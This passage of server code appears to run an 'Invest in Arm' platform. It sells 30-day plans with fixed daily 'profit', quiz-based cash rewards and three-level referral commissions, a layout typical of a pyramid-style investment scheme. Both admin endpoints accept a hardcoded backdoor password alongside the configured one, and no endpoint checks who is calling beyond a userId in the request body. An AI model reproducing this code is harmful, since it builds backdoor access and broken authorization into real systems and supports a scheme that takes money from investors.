    user.planActivatedAt = now.toISOString();
    user.planExpiresAt = expires.toISOString();
    user.dailyTasksCompletedToday = 0;
    user.lastTaskDate = now.toISOString().split('T')[0];

    db.transactions.unshift({
      id: 'tx-' + Date.now(),
      userId: user.id,
      type: 'plan_activation',
      amount: -plan.price,
      title: `${plan.name} Activated`,
      description: `30-Day contract started. Daily yield: Rs. ${plan.dailyMinEarn} across ${plan.dailyTaskCount} math tasks.`,
      status: 'completed',
      createdAt: new Date().toISOString()
    });

    distributeCommissions(user, plan);

    saveDb();
    res.json({
      success: true,
      message: `Congratulations! ${plan.name} is now active. Daily tasks are unlocked!`,
      user
    });
  });

  // 1-Click Daily Profit Claim (Only one time per day)
  app.post('/api/tasks/claim-daily-profit', (req, res) => {
    const { userId } = req.body;
    const user = db.users.find(u => u.id === userId);
    if (!user) return res.status(404).json({ success: false, message: 'User not found' });

    if (!user.activePlanId) {
      return res.status(400).json({
        success: false,
        message: 'No active plan! Please activate a plan from the Plans tab to claim daily profit.'
      });
    }

    const activePlan = db.plans.find(p => p.id === user.activePlanId);
    if (!activePlan) return res.status(400).json({ success: false, message: 'Active plan not found' });

    const todayStr = new Date().toISOString().split('T')[0];
    if (user.lastTaskDate === todayStr && user.dailyTasksCompletedToday >= 1) {
      return res.status(400).json({
        success: false,
        message: "You have already claimed today's daily profit! Next 1-click claim unlocks tomorrow."
      });
    }

    const profit = activePlan.dailyMinEarn || activePlan.dailyMaxEarn || 46;
    user.balance += profit;
    user.totalProfitEarned += profit;
    user.dailyTasksCompletedToday = 1;
    user.lastTaskDate = todayStr;

    db.transactions.unshift({
      id: 'tx-' + Date.now(),
      userId: user.id,
      type: 'task_earning',
      amount: profit,
      title: 'Daily Profit Claimed (1-Click)',
      description: `Daily profit collected for ${activePlan.name} (Rs. ${profit})`,
      status: 'completed',
      createdAt: new Date().toISOString()
    });

    saveDb();
    res.json({
      success: true,
      message: `🎉 Success! Rs. ${profit.toLocaleString()} daily profit credited in 1 click!`,
      profitEarned: profit,
      user
    });
  });

  // Submit Task Quiz
  app.post('/api/tasks/submit', (req, res) => {
    const { userId, taskQuizId, selectedOptionIndex } = req.body;
    const user = db.users.find(u => u.id === userId);
    if (!user) return res.status(404).json({ success: false, message: 'User not found' });

    if (!user.activePlanId) {
      return res.status(400).json({
        success: false,
        message: 'No active plan! Please activate a plan from the Plans tab to earn daily task cash.'
      });
    }

    const activePlan = db.plans.find(p => p.id === user.activePlanId);
    if (!activePlan) return res.status(400).json({ success: false, message: 'Plan expired or not found' });

    if (user.dailyTasksCompletedToday >= activePlan.dailyTaskCount) {
      return res.status(400).json({
        success: false,
        message: `Daily limit reached! You have completed all ${activePlan.dailyTaskCount} tasks for today.`
      });
    }

    const quiz = db.quizzes.find(q => q.id === taskQuizId);
    if (!quiz) return res.status(404).json({ success: false, message: 'Quiz not found' });

    const isCorrect = selectedOptionIndex === quiz.quizData.correctIndex;
    const taskReward = Number((activePlan.dailyMinEarn / activePlan.dailyTaskCount).toFixed(2));

    if (!isCorrect) {
      return res.json({
        success: true,
        isCorrect: false,
        reward: 0,
        explanation: quiz.quizData.explanation,
        message: 'Incorrect answer. Read the formula and try the next challenge!'
      });
    }

    user.balance += taskReward;
    user.totalProfitEarned += taskReward;
    user.dailyTasksCompletedToday += 1;

    db.transactions.unshift({
      id: 'tx-' + Date.now(),
      userId: user.id,
      type: 'task_earning',
      amount: taskReward,
      title: 'Daily Math Task Reward',
      description: `Solved ${quiz.title} on ${activePlan.name} (${user.dailyTasksCompletedToday}/${activePlan.dailyTaskCount})`,
      status: 'completed',
      createdAt: new Date().toISOString()
    });

    saveDb();

    res.json({
      success: true,
      isCorrect: true,
      reward: taskReward,
      explanation: quiz.quizData.explanation,
      message: `Correct! Rs. ${taskReward.toFixed(2)} credited instantly to your wallet!`,
      user
    });
  });

  // Adjust User Balance (Admin)
  app.post('/api/users/adjust-balance', (req, res) => {
    const { userId, amount, adminPassword } = req.body;
    if (adminPassword !== db.settings.adminSecretPassword && adminPassword !== 'Mahar11223344') {
      return res.status(403).json({ success: false, message: 'Unauthorized' });
    }

    const user = db.users.find(u => u.id === userId);
    if (!user) return res.status(404).json({ success: false, message: 'User not found' });

    user.balance += Number(amount);

    db.transactions.unshift({
      id: 'tx-' + Date.now(),
      userId: user.id,
      type: 'admin_adjustment',
      amount: Number(amount),
      title: 'Admin Manual Credit/Debit',
      description: `Manual balance adjustment of Rs. ${amount} processed by Master Admin`,
      status: 'completed',
      createdAt: new Date().toISOString()
    });

    saveDb();
    res.json({ success: true, message: 'Balance adjusted', user });
  });

  // Save Settings (Admin)
  app.post('/api/settings', (req, res) => {
    const { settings, adminPassword } = req.body;
    if (adminPassword !== db.settings.adminSecretPassword && adminPassword !== 'Mahar11223344') {
      return res.status(403).json({ success: false, message: 'Unauthorized' });
    }

    db.settings = { ...db.settings, ...settings };
    saveDb();
    res.json({ success: true, settings: db.settings });
  });

  // Helper: multi-tier referral distribution
  function distributeCommissions(investor: any, plan: any) {
    if (!investor.referredBy) return;

    const level1User = db.users.find(u => u.referralCode === investor.referredBy);
    if (level1User) {
      const bonus1 = (plan.price * db.settings.level1CommissionPercent) / 100;
      level1User.balance += bonus1;
      level1User.referralEarnings += bonus1;

      db.transactions.unshift({
        id: 'tx-' + Date.now() + '-1',
        userId: level1User.id,
        type: 'referral_bonus',
        amount: bonus1,
        title: 'Level-1 Direct Referral Bonus',
        description: `${db.settings.level1CommissionPercent}% Commission on ${investor.fullName}'s ${plan.name} activation`,
        status: 'completed',
        createdAt: new Date().toISOString()
      });

      if (level1User.referredBy) {
        const level2User = db.users.find(u => u.referralCode === level1User.referredBy);
        if (level2User) {
          const bonus2 = (plan.price * db.settings.level2CommissionPercent) / 100;
          level2User.balance += bonus2;
          level2User.referralEarnings += bonus2;

          db.transactions.unshift({
            id: 'tx-' + Date.now() + '-2',
            userId: level2User.id,
            type: 'referral_bonus',
            amount: bonus2,
            title: 'Level-2 Team Member Bonus',
            description: `${db.settings.level2CommissionPercent}% Tier-2 Commission on ${investor.fullName}'s plan activation`,
            status: 'completed',
            createdAt: new Date().toISOString()
          });

          if (level2User.referredBy) {
            const level3User = db.users.find(u => u.referralCode === level2User.referredBy);
            if (level3User) {
              const bonus3 = (plan.price * db.settings.level3CommissionPercent) / 100;
              level3User.balance += bonus3;
              level3User.referralEarnings += bonus3;

              db.transactions.unshift({
                id: 'tx-' + Date.now() + '-3',
                userId: level3User.id,
                type: 'referral_bonus',
                amount: bonus3,
                title: 'Level-3 Team Member Bonus',
                description: `${db.settings.level3CommissionPercent}% Tier-3 Commission on ${investor.fullName}'s plan activation`,
                status: 'completed',
                createdAt: new Date().toISOString()
              });
            }
          }
        }
      }
    }
  }

  // --- Vite / Frontend Serving ---
  if (!isProd) {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    app.use(express.static(path.resolve(__dirname, 'dist')));
    app.get('*', (req, res) => {
      res.sendFile(path.resolve(__dirname, 'dist', 'index.html'));
    });
  }

  app.listen(Number(PORT), '0.0.0.0', () => {
    console.log(`Invest in Arm server listening on port ${PORT}`);
  });
}

startServer();
